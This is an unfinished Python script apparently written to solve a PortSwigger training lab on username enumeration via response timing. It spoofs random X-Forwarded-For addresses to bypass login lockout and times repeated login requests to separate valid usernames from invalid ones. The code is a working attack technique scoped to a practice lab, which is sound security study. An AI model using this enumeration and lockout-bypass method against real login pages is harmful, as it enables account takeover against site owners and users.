# A simple python program made to solve the following PortSwigger Lab:
# https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing

'''





THIS PROGRAM IS NOT READY








'''


import requests
import random
import time

SCHEME = "HTTPS://"
URL = "web-security-academy.net"
PATH = "/login"
SUB_DOMAIN = "" # Change This Line With Labs Subdomain
FULL_PATH = SCHEME + SUB_DOMAIN + "." + URL + PATH
USERNAME_FILE = "./username-wordlist.txt"
PASSWORD_FILE = "./password-wordlist.txt"
VALID_USERNAME = "wiener" # Needed to establish baseline
VALID_PASSWORD = "peter" # Needed to establish baseline
FAKE_USERNAME = "notarealperson" # Needed to establish baseline
FAKE_PASSWORD = "not-a-real-password-just-an-obscenely-long-password" # Needed to establish baseline
REQUESTS = 15


# Get baseline for right username with very long password
# Get baseline for fake username with very long password



def informUserOfConfiguration():
    print(f"Program Starting...")
    print(f"Target URL: {FULL_PATH}")
    print(f"Usernames Loaded From: {USERNAME_FILE}")
    print(f"Passwords Loaded From: {PASSWORD_FILE}")
    return 0

def appendFileLinesToArray(file_name):
    print(f"Loading {file_name}")
    array = []
    with open(file_name, 'r') as file:
        for line in file:
            array.append(line.strip())
    return array

# IP Address Needs To Be Spoofed In Order To Bypass Lockout
def generateIPAddress():
    four_random_nums = [str(random.randint(1, 255)) for i in range(4)]
    random_ip = ".".join(four_random_nums)
    print(f"Random IP Address Generated: {random_ip}")
    return random_ip

def craftPostHeaderAndData(usern, passw):
    headers = {"X-Forwarded-For" : generateIPAddress()}
    data = {"username": usern, "password": passw}
    print(f"X-Forwarded-For Header Has Been Set With IP Address {headers['X-Forwarded-For']}")
    print(f"POST Data has been set with the following username and password... {data['username']}:{data['password']}")
    return headers, data

def getAverageResponseTime(usern, passw):
    times = []
    for i in range(REQUESTS):
        headers, data = craftPostHeaderAndData(usern, passw)
        print(f"Sending POST Request {i + 1} of {REQUESTS}, Collecting Response Times...")
        start_time = time.time()
        response = requests.post(FULL_PATH, headers = headers, data = data)
        end_time = time.time()
        times.append(end_time - start_time)
    return sum(times) / len(times)

def getBaselines():
    # Get average time it takes for server to respond to valid credentials
    print(f"Getting Baseline For Valid Credentials...")
    time_for_valid_creds = getAverageResponseTime(VALID_USERNAME, VALID_PASSWORD)
    # Get average time it takes for server to respond to false credentials
    print(f"Getting Baseline For False Credentials...")
    time_for_false_creds = getAverageResponseTime(FAKE_USERNAME, FAKE_PASSWORD)
    # Get average time it takes for server to respond to valid username and false password
    print(f"Getting Baseline For Valid Username With Fake Password...")
    time_for_val_user_fake_pass = getAverageResponseTime(VALID_USERNAME, FAKE_PASSWORD)
    return [time_for_valid_creds, time_for_false_creds, time_for_val_user_fake_pass]


baselines = getBaselines()

print(f"Average Time For Valid Credentials: {baselines[0]}")
print(f"Average Time For False Credentials: {baselines[1]}")
print(f"Average Time For Valid Username With Fake Password: {baselines[2]}")



# Obscenely long password


